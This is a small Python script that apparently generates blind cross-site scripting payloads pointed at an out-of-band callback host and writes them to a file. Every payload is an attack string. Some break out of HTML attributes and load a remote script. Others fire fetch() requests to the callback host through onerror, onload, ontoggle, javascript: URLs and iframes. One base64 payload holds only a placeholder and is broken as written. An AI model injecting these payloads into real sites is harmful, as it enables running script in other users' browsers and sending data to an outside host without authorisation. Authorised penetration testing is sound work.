import sys
import argparse

def generate():
    parser = argparse.ArgumentParser()
    parser.add_argument("oast_url")
    parser.add_argument("output_file")
    parser.add_argument("--all", action="store_true")
    args = parser.parse_args()

    # Smart/Default Payloads
    payloads = [
        f'"><script src="https://{args.oast_url}/js"></script>',
        f'"><img src=x onerror="fetch(\'https://{args.oast_url}/img\')">',
        f'"><svg/onload=eval(atob(\'{args.oast_url}_base64_here\'))>'
    ]

    # Add "Full" mode payloads if requested
    if args.all:
        payloads.extend([
            f"javascript:fetch('https://{args.oast_url}/proto')",
            f'<iframe src="javascript:alert(1)" onload="fetch(\'https://{args.oast_url}/ifr\')">',
            f'"><details open ontoggle="fetch(\'https://{args.oast_url}/det\')">'
        ])

    with open(args.output_file, "w") as f:
        f.write("\n".join(payloads))

if __name__ == "__main__":
    generate()
